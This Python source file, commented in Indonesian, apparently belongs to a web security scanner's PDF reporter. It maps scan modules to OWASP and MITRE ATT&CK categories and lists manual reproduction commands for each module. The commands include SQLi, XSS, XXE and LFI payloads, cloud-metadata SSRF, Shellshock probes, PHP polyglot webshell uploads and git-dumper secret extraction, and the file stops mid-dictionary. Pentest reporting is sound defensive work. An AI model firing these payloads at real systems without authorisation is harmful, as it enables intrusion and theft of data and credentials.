"""Standar industri tambahan untuk report (OWASP / MITRE / Reproduksi).

File ini melengkapi `explainer.py` (yang sudah berisi friendly_name,
what_it_means, business_impact untuk semua 105 modul) dengan:

  * OWASP_MAP   - kategori OWASP Top 10 2021 per modul
  * MITRE_MAP   - teknik MITRE ATT&CK per modul
  * REPRO_MAP   - perintah/langkah reproduksi manual (curl, dig, dst.)

Konten ini dipakai oleh PDF reporter untuk memperkaya tiap finding.
Modul yang tidak ada di sini akan jatuh ke fallback generik.

Note:
- Mapping OWASP/MITRE diturunkan dari modul yang dijalankan, bukan
  hanya dari CWE per finding (CWE_TO_OWASP di Finding model sudah
  meng-cover yang itu).
- Glossary istilah ada di explainer.GLOSSARY (jangan duplikasi di sini).
"""
from __future__ import annotations

# --------------------------- OWASP Top 10 2021 ---------------------------
OWASP_MAP: dict[str, str] = {
    # Recon
    "dns": "Informasional",
    "whois": "Informasional",
    "ports": "A05:2021 Security Misconfiguration",
    "subdomains": "Informasional",
    "subdomain_takeover": "A05:2021 Security Misconfiguration",
    "fingerprint": "A06:2021 Vulnerable & Outdated Components",
    "api_discovery": "A05:2021 Security Misconfiguration",
    "crawler": "Informasional",
    "email_security": "A02:2021 Cryptographic Failures",
    "email_security_extended": "A02:2021 Cryptographic Failures",
    "nextjs_specific": "A05:2021 Security Misconfiguration",
    "cf_origin": "A05:2021 Security Misconfiguration",
    "wayback": "Informasional",
    "framework_default": "A05:2021 Security Misconfiguration",
    "graphql_deep": "A09:2021 Security Logging & Monitoring Failures",
    "source_leak": "A05:2021 Security Misconfiguration",
    "cms_scan": "A06:2021 Vulnerable & Outdated Components",
    "cloud_buckets": "A05:2021 Security Misconfiguration",
    "k8s_exposure": "A05:2021 Security Misconfiguration",
    "dependency_confusion": "A08:2021 Software & Data Integrity Failures",
    "favicon_hash": "Informasional",

    # Passive
    "headers": "A05:2021 Security Misconfiguration",
    "tls": "A02:2021 Cryptographic Failures",
    "cookies": "A07:2021 Identification & Authentication Failures",
    "cors": "A05:2021 Security Misconfiguration",
    "clickjacking": "A05:2021 Security Misconfiguration",
    "methods": "A05:2021 Security Misconfiguration",
    "sensitive_files": "A05:2021 Security Misconfiguration",
    "robots": "A05:2021 Security Misconfiguration",
    "csrf": "A01:2021 Broken Access Control",
    "jwt": "A02:2021 Cryptographic Failures",
    "outdated_libs": "A06:2021 Vulnerable & Outdated Components",
    "mixed_content": "A02:2021 Cryptographic Failures",
    "csp_evaluator": "A05:2021 Security Misconfiguration",
    "captcha_check": "A07:2021 Identification & Authentication Failures",
    "cache_control_audit": "A04:2021 Insecure Design",
    "cors_advanced": "A05:2021 Security Misconfiguration",
    "cookie_scope": "A07:2021 Identification & Authentication Failures",
    "sentry_dsn_leak": "A05:2021 Security Misconfiguration",
    "server_timing_header": "Informasional",
    "api_key_in_url": "A02:2021 Cryptographic Failures",
    "autocomplete_audit": "A04:2021 Insecure Design",
    "exif_leak": "A01:2021 Broken Access Control",
    "homoglyph_check": "A04:2021 Insecure Design",

    # Active - Injection
    "sqli": "A03:2021 Injection",
    "nosqli": "A03:2021 Injection",
    "xss": "A03:2021 Injection",
    "stored_xss": "A03:2021 Injection",
    "dom_xss": "A03:2021 Injection",
    "cmdi": "A03:2021 Injection",
    "ldap_injection": "A03:2021 Injection",
    "xpath_injection": "A03:2021 Injection",
    "xslt_injection": "A03:2021 Injection",
    "ssti": "A03:2021 Injection",
    "log_injection": "A09:2021 Security Logging & Monitoring Failures",
    "csv_injection": "A03:2021 Injection",
    "crlf_injection": "A03:2021 Injection",
    "response_splitting": "A03:2021 Injection",
    "deserialization": "A08:2021 Software & Data Integrity Failures",

    # Active - Access control
    "redirect": "A01:2021 Broken Access Control",
    "lfi": "A01:2021 Broken Access Control",
    "dirlist": "A05:2021 Security Misconfiguration",
    "host_header": "A05:2021 Security Misconfiguration",
    "ssrf": "A10:2021 Server-Side Request Forgery (SSRF)",
    "ssrf_metadata": "A10:2021 Server-Side Request Forgery (SSRF)",
    "url_preview_ssrf": "A10:2021 Server-Side Request Forgery (SSRF)",
    "xxe": "A05:2021 Security Misconfiguration",
    "idor_generic": "A01:2021 Broken Access Control",
    "mass_assignment": "A04:2021 Insecure Design",
    "auth_bypass": "A07:2021 Identification & Authentication Failures",
    "private_profile_bypass": "A01:2021 Broken Access Control",
    "media_persistence": "A01:2021 Broken Access Control",
    "dm_privacy": "A01:2021 Broken Access Control",
    "social_csrf": "A01:2021 Broken Access Control",
    "logout_csrf": "A01:2021 Broken Access Control",
    "rate_limit_bypass": "A07:2021 Identification & Authentication Failures",
    "captcha_bypass": "A07:2021 Identification & Authentication Failures",
    "unicode_bypass": "A04:2021 Insecure Design",

    # Active - Auth & session
    "session": "A07:2021 Identification & Authentication Failures",
    "otp_check": "A07:2021 Identification & Authentication Failures",
    "password_reset": "A07:2021 Identification & Authentication Failures",
    "jwt_confusion": "A02:2021 Cryptographic Failures",
    "oauth_check": "A07:2021 Identification & Authentication Failures",
    "oauth_takeover": "A07:2021 Identification & Authentication Failures",
    "webhook_signature": "A08:2021 Software & Data Integrity Failures",

    # Active - Money / fraud / business logic
    "voucher": "A04:2021 Insecure Design",
    "payment": "A04:2021 Insecure Design",
    "balance": "A04:2021 Insecure Design",
    "race_condition": "A04:2021 Insecure Design",
    "timing_attack": "A02:2021 Cryptographic Failures",

    # Active - Misc
    "forms": "A04:2021 Insecure Design",
    "file_upload": "A05:2021 Security Misconfiguration",
    "zip_slip": "A01:2021 Broken Access Control",
    "cache_poison": "A05:2021 Security Misconfiguration",
    "hpp": "A05:2021 Security Misconfiguration",
    "rfd": "A05:2021 Security Misconfiguration",
    "pii_leak": "A02:2021 Cryptographic Failures",
    "proto_pollution": "A03:2021 Injection",
    "http_smuggling": "A05:2021 Security Misconfiguration",
    "ws_check": "A05:2021 Security Misconfiguration",
    "env_leak": "A05:2021 Security Misconfiguration",
    "api_auth": "A07:2021 Identification & Authentication Failures",
    "graphql_dos": "A04:2021 Insecure Design",

    # Simulate
    "rate_limit": "A07:2021 Identification & Authentication Failures",
    "burst": "A04:2021 Insecure Design",

    # ============ DEEP SCANNERS (PR #9 + PR #10) ============
    # PR #9
    "db_exposure": "A05:2021 Security Misconfiguration",
    "saldo_deep": "A04:2021 Insecure Design",
    "file_inject": "A05:2021 Security Misconfiguration",
    "webhook_deep": "A08:2021 Software & Data Integrity Failures",
    "subdomain_access": "A05:2021 Security Misconfiguration",
    # PR #10 - active
    "shellshock": "A06:2021 Vulnerable & Outdated Components",
    "mfa_bypass": "A07:2021 Identification & Authentication Failures",
    "password_policy": "A07:2021 Identification & Authentication Failures",
    # PR #10 - passive
    "referrer_policy": "A05:2021 Security Misconfiguration",
    "permission_policy": "A05:2021 Security Misconfiguration",
    "coop_coep": "A05:2021 Security Misconfiguration",
    "hash_disclosure": "A02:2021 Cryptographic Failures",
    # PR #10 - recon
    "git_disclosure": "A05:2021 Security Misconfiguration",
    "svn_disclosure": "A05:2021 Security Misconfiguration",
    "ds_store_leak": "A05:2021 Security Misconfiguration",
    "iis_shortname": "A05:2021 Security Misconfiguration",
    "wp_scan": "A06:2021 Vulnerable & Outdated Components",
    "joomla_scan": "A06:2021 Vulnerable & Outdated Components",
    "drupal_scan": "A06:2021 Vulnerable & Outdated Components",
    "vhost_brute": "A05:2021 Security Misconfiguration",
    "waf_detect": "Informasional",
}

# --------------------------- MITRE ATT&CK --------------------------------
MITRE_MAP: dict[str, str] = {
    # Recon
    "dns": "T1590.002 DNS",
    "whois": "T1591 Gather Victim Org Information",
    "ports": "T1046 Network Service Discovery",
    "subdomains": "T1590.005 IP Addresses",
    "subdomain_takeover": "T1584 Compromise Infrastructure",
    "fingerprint": "T1592.002 Software",
    "api_discovery": "T1190 / T1083",
    "crawler": "T1592 Gather Victim Host Information",
    "email_security": "T1589 Gather Victim Identity Information",
    "email_security_extended": "T1589.002 Email Addresses",
    "nextjs_specific": "T1592.002 Software",
    "cf_origin": "T1090 Proxy",
    "wayback": "T1593.003 Code Repositories",
    "framework_default": "T1592.002 Software",
    "graphql_deep": "T1190 Exploit Public-Facing Application",
    "source_leak": "T1213 Data from Information Repositories",
    "cms_scan": "T1592.002 Software",
    "cloud_buckets": "T1530 Data from Cloud Storage",
    "k8s_exposure": "T1213 Data from Information Repositories",
    "dependency_confusion": "T1195.001 Compromise Software Dependencies",
    "favicon_hash": "T1592 (Recon)",

    # Passive
    "headers": "T1190 Exploit Public-Facing Application",
    "tls": "T1040 Network Sniffing",
    "cookies": "T1539 Steal Web Session Cookie",
    "cors": "T1190 Exploit Public-Facing Application",
    "clickjacking": "T1204 User Execution",
    "methods": "T1190 Exploit Public-Facing Application",
    "sensitive_files": "T1083 File and Directory Discovery",
    "robots": "T1083 File and Directory Discovery",
    "csrf": "T1204 User Execution",
    "jwt": "T1606 Forge Web Credentials",
    "outdated_libs": "T1190 Exploit Public-Facing Application",
    "mixed_content": "T1557 Adversary-in-the-Middle",
    "csp_evaluator": "T1190 Exploit Public-Facing Application",
    "captcha_check": "T1110 Brute Force",
    "cache_control_audit": "T1530 Data from Cloud Storage",
    "cors_advanced": "T1190 Exploit Public-Facing Application",
    "cookie_scope": "T1539 Steal Web Session Cookie",
    "sentry_dsn_leak": "T1552 Unsecured Credentials",
    "server_timing_header": "T1592 Gather Victim Host Information",
    "api_key_in_url": "T1552.001 Credentials In Files",
    "autocomplete_audit": "T1212 Exploitation for Credential Access",
    "exif_leak": "T1592 Gather Victim Host Information",
    "homoglyph_check": "T1583.001 Domains",

    # Active - Injection
    "sqli": "T1190 Exploit Public-Facing Application",
    "nosqli": "T1190 Exploit Public-Facing Application",
    "xss": "T1059.007 JavaScript",
    "stored_xss": "T1059.007 JavaScript (persistent)",
    "dom_xss": "T1059.007 JavaScript (DOM)",
    "cmdi": "T1059 Command and Scripting Interpreter",
    "ldap_injection": "T1190 Exploit Public-Facing Application",
    "xpath_injection": "T1190 Exploit Public-Facing Application",
    "xslt_injection": "T1190 Exploit Public-Facing Application",
    "ssti": "T1190 / T1059 Code Injection",
    "log_injection": "T1565.001 Stored Data Manipulation",
    "csv_injection": "T1204.002 Malicious File",
    "crlf_injection": "T1190 Exploit Public-Facing Application",
    "response_splitting": "T1190 Exploit Public-Facing Application",
    "deserialization": "T1190 / T1059 Deserialization RCE",

    # Active - Access control
    "redirect": "T1566 Phishing",
    "lfi": "T1083 / T1005 Data from Local System",
    "dirlist": "T1083 File and Directory Discovery",
    "host_header": "T1190 Exploit Public-Facing Application",
    "ssrf": "T1090 Proxy / T1552 Unsecured Credentials",
    "ssrf_metadata": "T1552.005 Cloud Instance Metadata API",
    "url_preview_ssrf": "T1090 Proxy",
    "xxe": "T1005 Data from Local System",
    "idor_generic": "T1078 Valid Accounts",
    "mass_assignment": "T1078 Valid Accounts",
    "auth_bypass": "T1212 Exploitation for Credential Access",
    "private_profile_bypass": "T1078 Valid Accounts",
    "media_persistence": "T1530 Data from Cloud Storage",
    "dm_privacy": "T1213 Data from Information Repositories",
    "social_csrf": "T1204 User Execution",
    "logout_csrf": "T1204 User Execution",
    "rate_limit_bypass": "T1110 Brute Force",
    "captcha_bypass": "T1110 Brute Force",
    "unicode_bypass": "T1027 Obfuscated Files or Information",

    # Active - Auth & session
    "session": "T1539 Steal Web Session Cookie",
    "otp_check": "T1111 Multi-Factor Authentication Interception",
    "password_reset": "T1556 Modify Authentication Process",
    "jwt_confusion": "T1606 Forge Web Credentials",
    "oauth_check": "T1528 Steal Application Access Token",
    "oauth_takeover": "T1528 Steal Application Access Token",
    "webhook_signature": "T1566.002 Spearphishing Link",

    # Active - Money / fraud / business logic
    "voucher": "T1499 Endpoint Denial of Service",
    "payment": "T1565.003 Runtime Data Manipulation",
    "balance": "T1565.003 Runtime Data Manipulation",
    "race_condition": "T1499 Endpoint Denial of Service",
    "timing_attack": "T1040 Network Sniffing",

    # Active - Misc
    "forms": "T1190 Exploit Public-Facing Application",
    "file_upload": "T1190 / T1505.003 Web Shell",
    "zip_slip": "T1574 Hijack Execution Flow",
    "cache_poison": "T1565.001 Stored Data Manipulation",
    "hpp": "T1190 Exploit Public-Facing Application",
    "rfd": "T1204.002 Malicious File",
    "pii_leak": "T1213 Data from Information Repositories",
    "proto_pollution": "T1059.007 JavaScript",
    "http_smuggling": "T1190 Exploit Public-Facing Application",
    "ws_check": "T1190 Exploit Public-Facing Application",
    "env_leak": "T1552.001 Credentials In Files",
    "api_auth": "T1190 Exploit Public-Facing Application",
    "graphql_dos": "T1499.003 Application Exhaustion Flood",

    # Simulate
    "rate_limit": "T1110 Brute Force",
    "burst": "T1499 Endpoint Denial of Service",

    # ============ DEEP SCANNERS (PR #9 + PR #10) ============
    "db_exposure": "T1213 Data from Information Repositories",
    "saldo_deep": "T1565.003 Runtime Data Manipulation",
    "file_inject": "T1190 / T1505.003 Web Shell",
    "webhook_deep": "T1565.001 Stored Data Manipulation",
    "subdomain_access": "T1592 Gather Victim Host Information",
    "shellshock": "T1190 Exploit Public-Facing Application (CVE-2014-6271)",
    "mfa_bypass": "T1111 Multi-Factor Authentication Interception",
    "password_policy": "T1110.001 Password Guessing",
    "referrer_policy": "T1592 Gather Victim Host Information",
    "permission_policy": "T1190 Exploit Public-Facing Application",
    "coop_coep": "T1190 Exploit Public-Facing Application",
    "hash_disclosure": "T1552.001 Credentials In Files",
    "git_disclosure": "T1213.003 Code Repositories",
    "svn_disclosure": "T1213.003 Code Repositories",
    "ds_store_leak": "T1083 File and Directory Discovery",
    "iis_shortname": "T1083 File and Directory Discovery",
    "wp_scan": "T1592.002 Software (WordPress)",
    "joomla_scan": "T1592.002 Software (Joomla!)",
    "drupal_scan": "T1592.002 Software (Drupal)",
    "vhost_brute": "T1590.005 Gather Victim Network Information: IP Addresses",
    "waf_detect": "T1592.002 Software (WAF/CDN)",
}

# --------------------------- Cara Reproduksi -----------------------------
# Placeholder {url} dan {host} akan diganti otomatis oleh PDF reporter.
REPRO_MAP: dict[str, str] = {
    # Recon
    "dns": "dig {host} ANY\ndig {host} TXT\ndig {host} MX\nnslookup -type=ANY {host}",
    "whois": "whois {host}",
    "ports": (
        "nmap -sV -p- --min-rate=1000 {host}\n"
        "# Service umum yang bahaya kalau terbuka tanpa auth:\n"
        "redis-cli -h {host}\nmongosh --host {host}\ncurl http://{host}:9200/"
    ),
    "subdomains": "subfinder -d {host} -all\namass enum -d {host}",
    "subdomain_takeover": (
        "dig CNAME {host}\ncurl -i https://{host}/\n"
        "# CNAME ke vendor + body 'No such bucket' = takeover candidate"
    ),
    "fingerprint": "curl -I {url}\nwhatweb {url}",
    "api_discovery": "curl -i {url}/swagger-ui.html\ncurl -i {url}/v3/api-docs",
    "cf_origin": "# Coba akses langsung ke origin via Censys/Shodan",
    "wayback": "curl 'https://web.archive.org/cdx/search/cdx?url=*.{host}/*&output=text&fl=original'",
    "graphql_deep": (
        "curl -X POST {url}/graphql -H 'Content-Type: application/json' \\\n"
        "  -d '{{\"query\":\"{{ __schema {{ types {{ name }} }} }}\"}}'"
    ),
    "cloud_buckets": "curl -I https://{host}.s3.amazonaws.com/",
    "k8s_exposure": "curl -k {url}/api/v1/namespaces\ncurl -k {url}:10250/pods",
    "favicon_hash": "# Pakai shodan: shodan search 'http.favicon.hash:<hash>'",
    "framework_default": "curl -I {url}",
    "source_leak": "curl -I {url}/.git/HEAD\ncurl -I {url}/.svn/entries",

    # Passive
    "headers": (
        "curl -I {url}\n"
        "# Header keamanan minimum:\n"
        "#   Strict-Transport-Security, Content-Security-Policy,\n"
        "#   X-Content-Type-Options, X-Frame-Options, Referrer-Policy."
    ),
    "tls": (
        "openssl s_client -connect {host}:443 -tls1_2 -servername {host}\n"
        "openssl s_client -connect {host}:443 -tls1   # WAJIB GAGAL\n"
        "# atau: ./testssl.sh {host}"
    ),
    "cookies": "curl -i {url}\n# Cookie session WAJIB: Secure; HttpOnly; SameSite=Lax",
    "cors": (
        "curl -i -H 'Origin: https://evil.example.com' {url}\n"
        "# Bila reflect Origin + Allow-Credentials: true -> exploitable"
    ),
    "cors_advanced": "curl -i -H 'Origin: https://attacker.{host}' {url}",
    "clickjacking": "# Buat iframe HTML: <iframe src='{url}'></iframe>",
    "methods": "curl -X TRACE {url}\ncurl -X PUT {url} -d 'test'\ncurl -X OPTIONS -i {url}",
    "sensitive_files": "curl -I {url}/.git/HEAD\ncurl -I {url}/.env\ncurl -I {url}/backup.zip",
    "robots": "curl {url}/robots.txt\ncurl {url}/sitemap.xml",
    "csrf": "# Buat halaman attacker dengan form auto-submit ke endpoint POST",
    "jwt": (
        "1. Decode token di https://jwt.io\n"
        "2. Bila alg=none -> ubah payload, hapus signature\n"
        "3. Bila HS256 -> brute-force: hashcat -m 16500 token.txt rockyou.txt"
    ),
    "outdated_libs": "# Bandingkan versi library di response dengan https://nvd.nist.gov",
    "mixed_content": "# Buka {url} di Chrome F12, filter 'Mixed Content'",
    "csp_evaluator": "# Pakai https://csp-evaluator.withgoogle.com",
    "captcha_check": "# Coba submit form berulang tanpa solve captcha",
    "cache_control_audit": "curl -i {url}",
    "cookie_scope": "# Periksa Domain & Path di Set-Cookie",
    "sentry_dsn_leak": "# Cari pattern https://[hash]@[org].ingest.sentry.io di JS",
    "server_timing_header": "curl -I {url}",
    "api_key_in_url": "# Cari pattern api_key= / token= di URL hasil crawl",
    "autocomplete_audit": "# Periksa autocomplete='off' pada input password",
    "exif_leak": "exiftool <gambar.jpg>",
    "homoglyph_check": "# Bandingkan host {host} dengan domain populer (lookalike)",

    # Active - Injection
    "sqli": (
        "curl \"{url}\"\ncurl \"{url}'\"            # tambah quote\n"
        "curl \"{url}' OR '1'='1\"\n"
        "# Verifikasi pakai sqlmap (HARUS dengan izin):\n"
        "  sqlmap -u \"{url}\" --batch --risk=1 --level=2"
    ),
    "nosqli": "curl \"{url}?username[$ne]=admin&password[$ne]=x\"",
    "xss": (
        "Buka {url}?q=<script>alert(document.domain)</script>\n"
        "Bila alert muncul -> Reflected XSS terkonfirmasi."
    ),
    "stored_xss": "# Submit payload XSS ke field profile/komentar, akses sebagai user lain",
    "dom_xss": "# Pakai DOM Invader (Burp) atau cari sink innerHTML/document.write",
    "cmdi": "# Tambah ke parameter: ;sleep 5  |sleep 5  `sleep 5`  $(sleep 5)",
    "ldap_injection": "# Coba: *)(uid=*  atau  *)(|(uid=*",
    "xpath_injection": "# Coba: ' or '1'='1  atau  '] | //*[@user='admin",
    "xslt_injection": "# Submit XML dengan elemen XSLT yang membaca system-property",
    "ssti": (
        "# Test payload sederhana per template engine:\n"
        "#   {{7*7}}    (Jinja2/Twig)  ->  49\n"
        "#   ${{7*7}}   (FreeMarker)\n"
        "#   <%= 7*7 %> (ERB)"
    ),
    "log_injection": "# Submit input dengan newline + entry palsu",
    "csv_injection": "# Submit input dengan =SUM(1+1) atau @SUM(1+1)",
    "crlf_injection": "curl \"{url}/%0d%0aSet-Cookie:session=evil\"",
    "response_splitting": "curl \"{url}/?x=foo%0d%0aLocation:%20//evil\"",
    "deserialization": "# Pakai ysoserial untuk Java, atau payload pickle Python",

    # Active - Access control & SSRF
    "redirect": "curl -I \"{url}?next=//evil.example.com\"",
    "lfi": "curl \"{url}/../../../../etc/passwd\"\ncurl \"{url}?file=../../../../etc/passwd%00\"",
    "dirlist": "# Buka {url}, lihat apakah tampil daftar file/folder",
    "host_header": (
        "curl -H 'Host: evil.example.com' {url}\n"
        "curl -H 'X-Forwarded-Host: evil.example.com' {url}"
    ),
    "ssrf": (
        "# Ganti parameter URL/callback/webhook dengan:\n"
        "#   http://127.0.0.1:80/\n"
        "#   file:///etc/passwd"
    ),
    "ssrf_metadata": (
        "# HANYA dengan izin tertulis:\n"
        "#   http://169.254.169.254/latest/meta-data/   (AWS)\n"
        "#   http://metadata.google.internal/           (GCP)"
    ),
    "url_preview_ssrf": "# Submit URL ke endpoint preview (chat/share) -> arah ke 127.0.0.1",
    "xxe": (
        "# POST XML body:\n"
        "#   <!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>"
    ),
    "idor_generic": "# Akses /api/users/123 sebagai user 124, lihat apakah data lain bocor",
    "mass_assignment": "# POST registrasi dengan tambahan field 'isAdmin=true' / 'role=admin'",
    "auth_bypass": "# Coba: header X-Forwarded-For: 127.0.0.1; bypass via /admin/..;/",
    "private_profile_bypass": "# Akses URL profile private via API call lain (mobile API, share link)",
    "media_persistence": "# Setelah hapus media, coba akses URL CDN-nya. Masih ada -> bug.",
    "dm_privacy": "# Coba akses /api/messages/<id> milik user lain",
    "social_csrf": "# Buat halaman attacker dengan form auto-submit ke aksi sosial (follow/post)",
    "logout_csrf": "# <img src='{url}/logout'> di halaman attacker",
    "rate_limit_bypass": "# Coba header X-Forwarded-For rotasi, atau case sensitivity di endpoint",
    "captcha_bypass": "# Submit form dengan captcha kosong / response captcha bekas",
    "unicode_bypass": "# Coba IDN homograph: пaypal.com (Cyrillic 'a') vs paypal.com",

    # Active - Auth & session
    "session": "# Login 2 sesi paralel, periksa apakah session ID dapat diprediksi",
    "otp_check": "# Coba submit OTP berulang (brute), atau request OTP ulang banyak kali",
    "password_reset": (
        "1. Trigger reset password dengan email user korban.\n"
        "2. Periksa apakah link reset bisa dipakai berulang / lintas user.\n"
        "3. Coba ubah Host header -> link reset mengarah ke domain attacker."
    ),
    "jwt_confusion": "# Ubah alg dari RS256 ke HS256, sign dengan public key sebagai secret",
    "oauth_check": "# Periksa redirect_uri whitelist; coba //attacker.com / open redirect",
    "oauth_takeover": "# Pakai akun OAuth attacker dengan email yang sama -> account merge",
    "webhook_signature": "# Submit webhook tanpa header signature / dengan signature lama",

    # Active - Money / fraud / business logic
    "voucher": "# Apply voucher yang sudah dipakai; apply 2x bersamaan (race)",
    "payment": (
        "# Tampering payload checkout: ubah amount, currency, atau status menjadi 'paid'.\n"
        "# Periksa juga apakah verifikasi server-side benar-benar terjadi."
    ),
    "balance": "# Withdraw lebih besar dari balance via race condition",
    "race_condition": (
        "# Pakai Burp Turbo Intruder atau curl -- parallel:\n"
        "#   for i in $(seq 1 30); do curl '{url}' & done"
    ),
    "timing_attack": "# Ukur waktu respons login antara user yang ada vs tidak ada",

    # Active - Misc
    "forms": "# Test setiap form input dengan payload XSS/SQLi standar",
    "file_upload": (
        "# Upload file shell.php.jpg, lalu akses URL upload-nya.\n"
        "# Variasi: shell.php%00.jpg, shell.pHp, double extension."
    ),
    "zip_slip": "# Upload zip dengan path ../../../../etc/cron.d/evil",
    "cache_poison": "# Inject header X-Forwarded-Host evil di request cacheable",
    "hpp": "curl '{url}?id=1&id=2'",
    "rfd": "curl '{url}/api;/foo.bat?cb=evil()'",
    "pii_leak": "# Akses endpoint /api/users tanpa auth atau dengan low-priv",
    "proto_pollution": "# Submit JSON dengan __proto__.<key> = value",
    "http_smuggling": "# Pakai smuggler.py atau smuggle.py untuk test TE.CL / CL.TE",
    "ws_check": "wscat -c wss://{host}/socket",
    "env_leak": "curl -I {url}/.env\ncurl -I {url}/config/.env",
    "api_auth": "# Akses /api/admin/* tanpa Authorization header",
    "graphql_dos": (
        "# Pakai query nested berlebihan:\n"
        "#   {{ posts {{ comments {{ author {{ posts {{ ... }} }} }} }} }}"
    ),

    # Simulate
    "rate_limit": (
        "1. Otomatisasi 20 percobaan login dengan password salah ke endpoint login.\n"
        "2. Bila tidak ada lockout/CAPTCHA setelah N percobaan -> rate-limit absen."
    ),
    "burst": "# Kirim 100 request paralel dengan ab atau hey, lihat apakah ada throttle",

    # ============ DEEP SCANNERS (PR #9 + PR #10) ============
    "db_exposure": (
        "# Probe panel admin DB:\n"
        "curl -i {url}/phpmyadmin/\ncurl -i {url}/adminer.php\n"
        "# Probe REST data store:\n"
        "curl -i {url}/_cat/indices?v\ncurl -i {url}/_all_dbs\n"
        "# Probe DB dump:\n"
        "curl -I {url}/backup.sql\ncurl -I {url}/db.sqlite\n"
        "# GraphQL introspection:\n"
        "curl -X POST {url}/graphql -H 'Content-Type: application/json' \\\n"
        "  -d '{{\"query\":\"{{ __schema {{ types {{ name fields {{ name }} }} }} }}\"}}'"
    ),
    "saldo_deep": (
        "# Tampering nilai saldo (login dulu kalau perlu):\n"
        "for amt in -1 0 1e-10 9223372036854775808 0.4999 NaN; do\n"
        "  curl -X POST {url} -d \"amount=$amt\"\ndone\n"
        "# Race condition:\n"
        "for i in $(seq 1 5); do curl -X POST {url} -d 'amount=1' & done\n"
        "# Idempotency abuse:\n"
        "curl -X POST {url} -H 'Idempotency-Key: test001' -d 'amount=1'\n"
        "curl -X POST {url} -H 'Idempotency-Key: test001' -d 'amount=1'"
    ),
    "file_inject": (
        "# Upload polyglot file:\n"
        "echo -e '\\xff\\xd8\\xff\\xe0<?php phpinfo();' > poly.jpg.php\n"
        "curl -F 'file=@poly.jpg.php' {url}\n"
        "# SVG XSS payload:\n"
        "echo '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>' > x.svg\n"
        "curl -F 'file=@x.svg' {url}\n"
        "# LFI via file param:\n"
        "curl '{url}?file=../../../../etc/passwd'"
    ),
    "webhook_deep": (
        "# Webhook tanpa signature (Midtrans-style):\n"
        "curl -X POST {url}/api/midtrans/notify -H 'Content-Type: application/json' \\\n"
        "  -d '{{\"transaction_status\":\"settlement\",\"order_id\":\"test-001\","
        "\"gross_amount\":\"10000.00\"}}'\n"
        "# Replay (kirim 2x identik) -> server harus dedupe:\n"
        "curl -X POST {url}/api/webhook -d @payload.json\n"
        "curl -X POST {url}/api/webhook -d @payload.json\n"
        "# SSRF via webhook config:\n"
        "curl -X POST {url}/api/webhooks/subscribe \\\n"
        "  -d '{{\"webhook_url\":\"http://169.254.169.254/latest/meta-data/\"}}'"
    ),
    "subdomain_access": (
        "# Probe semua subdomain hidup:\n"
        "for sub in admin dev staging api jenkins kibana grafana vault; do\n"
        "  curl -kI https://$sub.{host}/ 2>/dev/null | head -1\ndone\n"
        "# Cek panel internal (Jenkins, etc.):\n"
        "curl -k https://jenkins.{host}/ | grep -i 'jenkins'"
    ),
    "shellshock": (
        "# Vector 1 - echo marker:\n"
        "curl -A '() {{ :;}}; /bin/echo VULN-CHECK' {url}/cgi-bin/test.cgi\n"
        "# Vector 2 - time-based:\n"
        "time curl -A '() {{ :;}}; /bin/sleep 5' {url}/cgi-bin/test.cgi\n"
        "# Bila response tertunda 5 detik atau marker echo balik -> rentan."
    ),
    "mfa_bypass": (
        "# Status forgery:\n"
        "curl -X POST {url}/verify-2fa \\\n"
        "  -d '{{\"code\":\"000000\",\"verified\":true,\"is_2fa_passed\":true}}'\n"
        "# GET method swap:\n"
        "curl {url}/verify-2fa?code=000000\n"
        "# Skip-step (akses dashboard tanpa OTP):\n"
        "curl -b 'session=...' {url}/dashboard"
    ),
    "password_policy": (
        "# Test register dengan password lemah:\n"
        "for pw in '' '1' '12345' 'password' 'qwerty'; do\n"
        "  curl -X POST {url}/register \\\n"
        "    -d \"email=test_$RANDOM@example.com&password=$pw&password_confirmation=$pw\"\n"
        "done\n"
        "# Bandingkan response: yang sukses = policy lemah."
    ),
    "referrer_policy": (
        "curl -I {url}\n"
        "# Cek header `Referrer-Policy`. Nilai aman: strict-origin-when-cross-origin.\n"
        "# Nilai bahaya: unsafe-url, no-referrer-when-downgrade."
    ),
    "permission_policy": (
        "curl -I {url}\n"
        "# Cek header `Permissions-Policy`. Best practice: default-deny + opt-in.\n"
        "#   contoh: Permissions-Policy: camera=(), microphone=(), geolocation=(self)"
    ),
    "coop_coep": (
        "curl -I {url}\n"
        "# Cek 3 header isolasi:\n"
        "#   Cross-Origin-Opener-Policy: same-origin\n"
        "#   Cross-Origin-Embedder-Policy: require-corp\n"
        "#   Cross-Origin-Resource-Policy: same-origin"
    ),
    "hash_disclosure": (
        "# Cari pola hash di response:\n"
        "curl {url} | grep -E '\\$2[abxy]?\\$|argon2|eyJ[A-Za-z0-9_-]+\\.eyJ'\n"
        "# Periksa endpoint /api/users yang sering bocor password_hash."
    ),
    "git_disclosure": (
        "# Confirm exposure:\n"
        "curl -i {url}/.git/HEAD\ncurl -i {url}/.git/config\n"
        "# Auto-dump:\n"
        "git-dumper {url}/.git/ ./loot/\n"
        "cd ./loot && git log -p   # cari secret di history"
    ),
    "svn_disclosure": (
        "curl -i {url}/.svn/entries\n"
        "curl -i {url}/.svn/wc.db   # SQLite working-copy DB"
    ),
    "ds_store_leak": (
        "curl -I {url}/.DS_Store\n"
        "# Parse isi:\n"
        "curl -s {url}/.DS_Store | python3 -c \"import sys; d=sys.stdin.buffer.read(); "
        "print('magic OK' if d.startswith(b'\\x00\\x00\\x00\\x01Bud1') else 'no')\""
    ),
    "iis_shortname": (
        "# IIS short-filename probe:\n"
        "curl -i '{url}/*~1.aspx'\n"
        "curl -i '{url}/a*~1.aspx'\n"
        "# Bila 4 URL pasangan response berbeda -> IIS rentan disclosure."
    ),
    "wp_scan": (
        "# Fingerprint:\n"
        "curl -s {url} | grep -i 'wp-content\\|wp-includes\\|generator.*WordPress'\n"
        "# User enum:\n"
        "for i in 1 2 3; do curl -s -o /dev/null -w '%{{http_code}} %{{redirect_url}}\\n' "
        "{url}?author=$i; done\n"
        "curl {url}/wp-json/wp/v2/users\n"
        "# xmlrpc check:\n"
        "curl -X POST {url}/xmlrpc.php -d \\\n"
        "  '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName>"
        "<params/></methodCall>'"
    ),
    "joomla_scan": (
        "# Fingerprint:\n"
        "curl -s {url} | grep -i 'joomla\\|com_users'\n"
        "# Critical: installation directory belum dihapus:\n"
        "curl -i {url}/installation/index.php\n"
        "curl -i {url}/administrator/\ncurl -i {url}/htaccess.txt"
    ),
    "drupal_scan": (
